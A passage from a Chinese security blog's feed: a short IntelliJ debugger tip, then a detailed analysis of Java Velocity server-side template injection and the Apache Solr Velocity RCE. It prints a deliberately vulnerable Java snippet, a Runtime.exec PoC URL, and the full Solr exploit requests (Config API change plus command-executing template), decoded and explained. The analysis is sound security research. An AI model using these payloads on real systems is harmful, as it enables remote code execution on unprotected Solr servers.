      <category term="ysoserial-Gadget" scheme="https://summersec.github.io/tags/ysoserial-Gadget/"/>
    
  </entry>
  
  <entry>
    <title>Skipped breakpoint because it happened inside debugger evaluation</title>
    <link href="https://summersec.github.io/2020/05/05/Skipped%20breakpoint%20because%20it%20happened%20inside%20debugger%20evaluation/"/>
    <id>https://summersec.github.io/2020/05/05/Skipped%20breakpoint%20because%20it%20happened%20inside%20debugger%20evaluation/</id>
    <published>2020-05-05T04:42:16.000Z</published>
    <updated>2020-05-06T07:21:37.897Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp; 解决Skipped breakpoint at %code reference% because it happened inside debugger evaluation的通用方法。<br><img src="https://img-blog.csdnimg.cn/20200505201706460.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200505201642976.png" alt="在这里插入图片描述"></p><ol><li>先尝试去掉勾选 <code>Enable &#39;tostring0&#39; object view</code><blockquote><p>因为idea的debugger是默认会在内部将方法执行一次，然后回显提示数据，本意是很好，但有时候会干扰影响结果。</p></blockquote></li></ol><p><img src="https://img-blog.csdnimg.cn/20200505201349162.png" alt="在这里插入图片描述"></p><ol start="3"><li>如果还是不行就再去掉勾选<code>Enable alternative view for Collections classes</code>一定是可以的。<blockquote><p>idea默认在用户调试之前先执行<code>toString</code>方法，然后回显数据，也就是<code>“预知”</code>功能。但有时候会影响判断，但可以设置那些类中<code>toString</code>方法是是可以做<code>“预知”</code>。</p></blockquote></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&amp;emsp;&amp;emsp; 解决Skipped breakpoint at %code reference% because it happened inside debugger evaluation的通用方法。&lt;br&gt;&lt;img src=&quot;https://img-blog.
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java debugger" scheme="https://summersec.github.io/tags/Java-debugger/"/>
    
  </entry>
  
  <entry>
    <title>白头搔更短，SSTI惹人心！</title>
    <link href="https://summersec.github.io/2020/03/24/%E7%99%BD%E5%A4%B4%E6%90%94%E6%9B%B4%E7%9F%AD%EF%BC%8CSSTI%E6%83%B9%E4%BA%BA%E5%BF%83%EF%BC%81/"/>
    <id>https://summersec.github.io/2020/03/24/%E7%99%BD%E5%A4%B4%E6%90%94%E6%9B%B4%E7%9F%AD%EF%BC%8CSSTI%E6%83%B9%E4%BA%BA%E5%BF%83%EF%BC%81/</id>
    <published>2020-03-24T07:20:16.000Z</published>
    <updated>2020-05-06T07:19:31.441Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>为什么说Java审计南在SSTI呢？</strong></p><ol><li>现行SSTI(Server-Side Template Injection ) 资料不少，但与Java，以著名的先知社区为例（如下图所示），关于SSTI文章也不过几篇而已，但与Java相关的一篇都没有。<br><img src="https://img-blog.csdnimg.cn/2020031517280148.png" alt="在这里插入图片描述"></li><li>搜索CVE漏洞有关于SSTI的漏洞编号也不过只有几个而已。<br><img src="https://img-blog.csdnimg.cn/20200317133833592.png" alt="在这里插入图片描述"></li><li>如果你是一名老司机，已经挖过ssti漏洞，那你是否知道payload构造原理呢？本文为你解惑！老司机可以直接跳转到后记看本文，或者你只是想看payload构造原理亦如此，本文篇幅较长，建议先收藏。</li></ol><hr><h1 id="SSTI-服务端模板注入"><a href="#SSTI-服务端模板注入" class="headerlink" title="SSTI 服务端模板注入"></a>SSTI 服务端模板注入</h1><p>&emsp;&emsp; ssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty twig，java框架FreeMarker、jade、 velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。</p><p><img src="https://img-blog.csdnimg.cn/202003161429497.gif" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 漏洞源码</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">velocity</span><span class="params">(String template)</span></span>&#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line"></span><br><span class="line">        VelocityContext context = <span class="keyword">new</span> VelocityContext();</span><br><span class="line"></span><br><span class="line">        context.put(<span class="string">"author"</span>, <span class="string">"Elliot A."</span>);</span><br><span class="line">        context.put(<span class="string">"address"</span>, <span class="string">"217 E Broadway"</span>);</span><br><span class="line">        context.put(<span class="string">"phone"</span>, <span class="string">"555-1337"</span>);</span><br><span class="line"></span><br><span class="line">        StringWriter swOut = <span class="keyword">new</span> StringWriter();</span><br><span class="line">        <span class="comment">// 使用Velocity</span></span><br><span class="line">        Velocity.evaluate(context, swOut, <span class="string">"test"</span>, template);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>POC</strong><br><code>http://localhost:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)</code></p><hr><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Velocity.evaluate函数源码</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer out, String logTag, String instring)</span> <span class="keyword">throws</span> ParseErrorException, MethodInvocationException, ResourceNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>设置断点开始调试</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316151247751.png" alt="在这里插入图片描述"></p><ul><li>进入Velocity.evaluate方法查看方法详情</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer out, String logTag, String instring)</span> <span class="keyword">throws</span> ParseErrorException, MethodInvocationException, ResourceNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200316151614641.png" alt="在这里插入图片描述"></p><ul><li>继续跟进查看，这个就是Java最常见的get方法(初始化)。也是Java的特性之一封装性。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316152752486.png" alt="在这里插入图片描述"></p><ul><li>RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316153220725.png" alt="在这里插入图片描述"></p><ul><li>进入StringReader看看</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316154323392.png" alt="在这里插入图片描述"></p><ul><li>在进入evaluate查看方法具体实现过程</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">evaluate</span><span class="params">(Context context, Writer writer, String logTag, Reader reader)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (logTag == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(<span class="string">"logTag (i.e. template name) cannot be null, you must provide an identifier for the content being evaluated"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        </span><br><span class="line">            SimpleNode nodeTree = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 来到这里进行解析</span></span><br><span class="line">                nodeTree = <span class="keyword">this</span>.parse(reader, logTag);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ParseErrorException(var7, (String)<span class="keyword">null</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (TemplateInitException var8) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ParseErrorException(var8, (String)<span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">           <span class="comment">// 判断，然后进入this.render方法</span></span><br><span class="line">            <span class="keyword">return</span> nodeTree == <span class="keyword">null</span> ? <span class="keyword">false</span> : <span class="keyword">this</span>.render(context, writer, logTag, nodeTree);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>继续跟进render方法</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316161419209.png" alt="在这里插入图片描述"></p><ul><li>render方法里面还有一个render方法，真的是™烦。不过这个是simpleNodel类的render方法。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316161613552.png" alt="在这里插入图片描述"></p><ul><li><strong>高潮激情部分</strong>，由于前面两个没有什么用，让我们直接跳到第三个看，进入render方法。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162015493.png" alt="在这里插入图片描述"></p><ul><li>在这里我们不能发现有一个execute方法，这就是罪魁祸首。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162552984.png" alt="在这里插入图片描述"></p><ul><li>让我们进行跟进方法，由于是重构的execute方法，还是得看清楚点原理。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 截取的部分关键性源代码</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.numChildren; ++i) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.strictRef &amp;&amp; result == <span class="keyword">null</span>) &#123;</span><br><span class="line">                            methodName = <span class="keyword">this</span>.jjtGetChild(i).getFirstToken().image;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> VelocityException(<span class="string">"Attempted to access '"</span> + methodName + <span class="string">"' on a null value at "</span> + Log.formatFileString(<span class="keyword">this</span>.uberInfo.getTemplateName(), <span class="keyword">this</span>.jjtGetChild(i).getLine(), <span class="keyword">this</span>.jjtGetChild(i).getColumn()));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        previousResult = result;</span><br><span class="line">                        result = <span class="keyword">this</span>.jjtGetChild(i).execute(result, context);</span><br><span class="line">                        <span class="keyword">if</span> (result == <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.strictRef) &#123;</span><br><span class="line">                            failedChild = i;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><ul><li><p>上面的for循环我就不说了它的作用了，我们焦点放在previousResult （之前的结果）和result上面。</p></li><li><p>previousResult = result;首先这行代码使其它们保持一致</p></li><li><p>当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE<br><img src="https://img-blog.csdnimg.cn/20200316155414726.png" alt="在这里插入图片描述"></p></li><li><p>完整的效果展示<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xMTE0NTgwMS1mYjEyMzA5YjRjMDU5MmE2LmdpZg" alt></p></li><li><p>完整的调用链</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20200316162402512.png" alt="在这里插入图片描述"></p><hr><h1 id="案例分析-—-Apache-solr-Velocity-模版注入"><a href="#案例分析-—-Apache-solr-Velocity-模版注入" class="headerlink" title="案例分析 — Apache solr Velocity 模版注入"></a>案例分析 — Apache solr Velocity 模版注入</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>&emsp;&emsp; 这个漏洞是去年10月底爆出的漏洞，这里只做必要的简单复现，笔者在这篇文章里主要是分析，更加完整的<a href="https://blog.csdn.net/sun1318578251/article/details/102843715" target="_blank" rel="noopener">漏洞复现过程</a>参考。</p><ol><li>第一步修改配置，开启Velocity模版里<code>VelocityResponseWriter</code>初始化参数的<code>params.resource.loader.enabled</code>选项，该选项默认是<code>false</code>。查看<a href="https://www.w3cschool.cn/solr_doc/solr_doc-wcyd2hyj.html" target="_blank" rel="noopener">W3Cschool solr官方文档</a>可知，solr是配置api可以进行查看配置、修改配置的。</li></ol><p>访问查看<code>http://127.0.0.1:8983/solr/test/config</code>配置信息<br><img src="https://img-blog.csdnimg.cn/20200321162727737.png" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;test&#x2F;config HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200317150202155.png" alt="在这里插入图片描述"></p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;solr&#x2F;test&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200317151703268.png" alt="在这里插入图片描述"></p><hr><h2 id="漏洞分析环境搭建"><a href="#漏洞分析环境搭建" class="headerlink" title="漏洞分析环境搭建"></a>漏洞分析环境搭建</h2><p>&emsp;&emsp; 笔者在此是使用远程代码调试的方式，分析源码。<a href="https://archive.apache.org/dist/lucene/solr/8.2.0/" target="_blank" rel="noopener">源码下载地址</a>windows用户可以选择下载这两个，这里笔者下载下载第二个。（下载第一个需要编译，过程自行百度）<br><img src="https://img-blog.csdnimg.cn/20200317160246408.png" alt="在这里插入图片描述"></p><ol><li><p>解压，将源码导入idea中，并配置idea中远程代码调试。<br><img src="https://img-blog.csdnimg.cn/20200317160450347.png" alt="在这里插入图片描述"></p></li><li><p>在第二个下载压缩包路径CMD环境下（~~\solr-8.2.0\bin\），启动命令<code>solr start -p 8983 -f -a &quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8983&quot;</code><br><img src="https://img-blog.csdnimg.cn/20200317161340408.png" alt="在这里插入图片描述"></p></li><li><p>用idea打开项目，导入jar文件设置为library。（还有几处在solr-8.2.0\contrib\velocity\lib、solr-8.2.0\server\lib……）<br><img src="https://img-blog.csdnimg.cn/20200323143907966.png" alt="在这里插入图片描述"></p></li><li><p>打断点调试代码。分析一个web项目首先我们得看web.xml文件<code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\web.xml</code>，看第一句，发现<code>在solrconfig.xml中注册的任何路径（名称）都将发送到该过滤器</code>。<br><img src="https://img-blog.csdnimg.cn/20200321153010735.png" alt="在这里插入图片描述"></p></li></ol><ul><li>断点位置，为什么会在这里打个断点，笔者翻阅资料得知这里是核心位置。具体参考<a href="https://my.oschina.net/haitaohu/blog/3078667" target="_blank" rel="noopener">solr源码阅读</a>。<br><img src="https://img-blog.csdnimg.cn/20200321154555773.png" alt="在这里插入图片描述"></li></ul><hr><h2 id="漏洞成因分析-–-代码层"><a href="#漏洞成因分析-–-代码层" class="headerlink" title="漏洞成因分析 – 代码层"></a>漏洞成因分析 – 代码层</h2><h3 id="POC第一部分"><a href="#POC第一部分" class="headerlink" title="POC第一部分"></a>POC第一部分</h3><p>&emsp;&emsp; 第一部分分析请查看<a href="https://www.w3cschool.cn/solr_doc/solr_doc-wcyd2hyj.html" target="_blank" rel="noopener">Solr配置API：Config API</a>文档，文档中说明的很清楚。PS：漏洞复现的时候也有说明。<br><img src="https://img-blog.csdnimg.cn/2020032319153017.png?" alt="在这里插入图片描述"></p><hr><h3 id="POC后部分分析"><a href="#POC后部分分析" class="headerlink" title="POC后部分分析"></a>POC后部分分析</h3><ol><li>笔者这里直接说几个关键的部分代码<br>第一步先处理请求<br><img src="https://img-blog.csdnimg.cn/20200324135210989.png" alt="在这里插入图片描述"><ol start="2"><li><code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\lib\solr-core-8.2.0.jar!\org\apache\solr\servlet\SolrDispatchFilter.class</code>跳转到<code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\lib\solr-core-8.2.0.jar!\org\apache\solr\servlet\HttpSolrCall.class</code> 先处理参数wt，设置为velocity。<br><img src="https://img-blog.csdnimg.cn/20200324140636319.png" alt="在这里插入图片描述"></li><li>写入响应<br><img src="https://img-blog.csdnimg.cn/202003241354181.png" alt="在这里插入图片描述"></li><li>判断方法，写查询响应，进一步查看内容。solrReuest就是我们的payload。<br><img src="https://img-blog.csdnimg.cn/2020032414122987.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200324141356198.png" alt="在这里插入图片描述"></li><li>跳转到velocityResponWriter.class,会创建velocity模板引擎。在到133行的位置进入模板方法<br><img src="https://img-blog.csdnimg.cn/20200324141530325.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200324141916156.png" alt="在这里插入图片描述"></li><li>在这里会跳转到SimpleNode.class类（我们熟悉的类），第一步会设置指引，接着会到ASTReference.class 在第八的位置，会遍历方法，会执行命令。<br><img src="https://img-blog.csdnimg.cn/20200324142424569.png" alt="在这里插入图片描述"></li><li>在这里会跳转到ASTMethod类中，执行。<br><img src="https://img-blog.csdnimg.cn/20200324143631629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200324143501469.png" alt="在这里插入图片描述"></li><li>具体执行是velocity模板引擎中有一个ClassMap类中。<br><img src="https://img-blog.csdnimg.cn/20200323201336890.png" alt="在这里插入图片描述"></li></ol></li></ol><hr><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a><strong>知识补充</strong></h2><p>&emsp;&emsp; 在前面有涉及到JJTree、payload构造、JavaCC等知识，但笔者并没有详细的说明，笔者想先读者们简单了解一下这些知识，然后在说明一下简单做个简单说明。</p><h2 id="set语法"><a href="#set语法" class="headerlink" title="#set语法"></a><strong>#set语法</strong></h2><p>&emsp;&emsp; #set语法可以创建一个Velocity的变量，#set语法对应的Velocity语法树是ASTSetDirective类，翻开这个类的代码，可以发现它有两个子节点：分别是RightHandSide和LeftHandSide，分别代表“=”两边的表达式值。与Java语言的赋值操作有点不一样的是，左边的LeftHandSide可能是一个变量标识符，也可能是一个set方法调用。变量标识符很好理解，如前面的#set($var=“偶数”)，另外是一个set方法调用，如#set($person.name=”junshan”)，这实际上相当于Java中person.setName(“junshan”)方法的调用。</p><h2 id="foreach语法"><a href="#foreach语法" class="headerlink" title="#foreach语法"></a><strong>#foreach语法</strong></h2><p>Velocity中的循环语法只有这一种，它与Java中的for循环的语法糖形式十分类似，如#foreach($child in $person.children) $person.children表示的是一个集合，它可能是一个List集合或者一个数组，而$child表示的是每个从集合中取出的值。从render方法代码中可以看出，Velocity首先是取得$person.children的值，然后将这个值封装成Iterator集合，然后依次取出这个集合中的每一个值，将这个值以$child为变量标识符放入context中。除此以外需要特别注意的是，Velocity在循环时还在context中放入了另外两个变量，分别是counterName和hasNextName，这两个变量的名称分别在配置文件配置项directive.foreach.counter.name和directive.foreach.iterator.name中定义，它们表示当前的循环计数和是否还有下一个值。前者相当于for(int i=1;i&lt;10;i++)中的i值，后者相当于while(it.hasNext())中的it.hasNext()的值，这两个值在#foreach的循环体中都有可能用到。由于elementKey、counterName和hasNextName是在#foreach中临时创建的，如果当前的context中已经存在这几个变量，要把原始的变量值保存起来，以便在这个#foreach执行结束后恢复。如果context中没有这几个变量，那么#foreach执行结束后要删除它们，这就是代码最后部分做的事情，这与我们前面介绍的#set语法没有范围限制不同，#foreach中临时产生的变量只在#foreach中有效。</p><h2 id="JJTree渲染过程解析"><a href="#JJTree渲染过程解析" class="headerlink" title="JJTree渲染过程解析"></a><strong>JJTree渲染过程解析</strong></h2><p>下面是JJTree的语法树：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvOTkwNTMyLzIwMTYxMC85OTA1MzItMjAxNjEwMjUxNTI3NDM3NTAtMTA4MzgwODIyOC5wbmc?x-oss-process=image/format,png" alt></p><h2 id="关于POC构造方法补充说明"><a href="#关于POC构造方法补充说明" class="headerlink" title="关于POC构造方法补充说明"></a><strong>关于POC构造方法补充说明</strong></h2><p><strong>VelocityResponseWriter 初始化参数</strong></p><ul><li>template.base.dir<br>如果指定并作为文件系统目录存在，则将为此目录添加一个文件资源加载程序。此目录中的模板将覆盖 “solr” 资源加载程序模板。 </li><li>init.properties.file<br>指定一个属性文件名，必须存在于 Solr 的conf/目录（而不是在velocity/子目录中）或者 <lib> 的 JAR 文件的根中。 </lib></li><li>params.resource.loader.enabled<br>“params” 资源加载程序允许在 Solr 请求参数中指定模板。例如：</li></ul><p><code>http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=CUSTOM%3A%20%23core_namev.template=custom</code>表示要呈现一个名为“自定义”的模板，其值<code>v.template.custom</code>是自定义模板。默认情况下为<code>false</code>；它不常用，需要时启用。</p><ul><li>solr.resource.loader.enabled<br>“solr” 资源加载程序是默认注册的唯一模板加载程序。模板是由 SolrResourceLoader 从velocity/子目录下可见的资源提供的。VelocityResponseWriter 本身有一些内置的模板（在它 JAR 文件中的velocity/），这些模板可以通过这个加载程序自动使用。当相同的模板名称处于 conf/velocity/ 或使用template.base.dir选项时，可以覆盖这些内置模板。 </li></ul><hr><p><strong>VelocityResponseWriter请求参数</strong></p><ul><li><p>v.template<br>指定要呈现的模板的名称。</p></li><li><p>v.layout<br>指定一个模板名称，用作围绕主<code>v.template</code>指定模板的布局。<br>主模板呈现为包含在布局渲染中的字符串值$content。</p></li><li><p>v.layout.enabled<br>确定主模板是否应该有围绕它的布局。默认是<code>true</code>，但也需要指定<code>v.layout</code>。<br>v.contentType<br>指定 HTTP 响应中使用的内容类型。如果没有指定，默认取决于是否指定<code>v.json</code>。<br>默认情况下不包含<code>v.json=wrf：text/html;charset=UTF-8</code>。<br>默认为<code>v.json=wrf：application/json;charset=UTF-8</code>。</p></li><li><p>v.json<br>指定一个函数名称来包装呈现为 JSON 的响应。如果指定，则响应中使用的内容类型将为“application / json; charset = UTF-8”，除非被<code>v.contentType</code>覆盖。<br>输出将采用以下格式（带<code>v.json=wrf</code>）：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrf(&quot;result&quot;:&quot;&lt;Velocity generated response string, with quotes and backslashes escaped&gt;&quot;)</span><br></pre></td></tr></table></figure></li><li><p>v.locale<br>使用<code>$resource</code>工具和其他 LocaleConfig 实现工具的语言环境。默认语言环境是<code>Locale.ROOT</code>。本地化资源从名为<code>resources[_locale-code].properties</code>的标准 Java 资源包中加载<br>可以通过提供由 SolrResourceLoader 在速度子下的资源包可见的 JAR 文件来添加资源包。资源包不能在<code>conf/</code>下加载，因为只有 SolrResourceLoader 的类加载程序方面可以在这里使用。</p></li><li><p>v.template.template_name<br>当启用 “params” 资源加载程序时，可以将模板指定为 Solr 请求的一部分。<br><code>params.resource.loader.enabled</code><br>“params” 资源加载程序允许在 Solr 请求参数中指定模板。例如：<br><code>http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=CUSTOM%3A%20%23core_name</code></p></li></ul><hr><ol><li>先将poc进行解码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8983&#x2F;solr&#x2F;test&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;#set($x&#x3D;&#39;&#39;) #set($rt&#x3D;$x.class.forName(&#39;java.lang.Runtime&#39;)) #set($chr&#x3D;$x.class.forName(&#39;java.lang.Character&#39;)) #set($str&#x3D;$x.class.forName(&#39;java.lang.String&#39;)) #set($ex&#x3D;$rt.getRuntime().exec(&#39;calc&#39;)) $ex.waitFor() #set($out&#x3D;$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure></li><li>set和foreach语法前面都介绍了，现在在看payload是不是就一目了然了？如何构造，为什么这么构造..<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set($x='')  </span><br><span class="line">#set($rt=$x.class.forName('java.lang.Runtime'))</span><br><span class="line">#set($chr=$x.class.forName('java.lang.Character'))  </span><br><span class="line">#set($str=$x.class.forName('java.lang.String'))</span><br><span class="line">#set($ex=$rt.getRuntime().exec('calc'))$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/2020031621445369.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200316214532444.png" alt="在这里插入图片描述"></li></ol><hr><p><strong>附图：各框架模板结构：</strong><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wNS5zc2wucWhpbWcuY29tL3QwMWY0NzkyYzdkMDNkZDQ5Y2MucG5n?x-oss-process=image/format,png" alt></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><p>&emsp;&emsp; Apache Solr的<code>Config API</code>是自带功能，用于通过HTTP请求更改配置；当Solr未设置访问鉴权时，可以直接通过ConfigAPI更改配置，为漏洞利用创造了前提。config api是solr多此爆出漏洞关键<a href="https://github.com/Imanfeng/Apache-Solr-RCE" target="_blank" rel="noopener">Apache Solr RCE</a>有想法的童鞋可以看看这个项目。</p><h2 id="题外话"><a href="#题外话" class="headerlink" 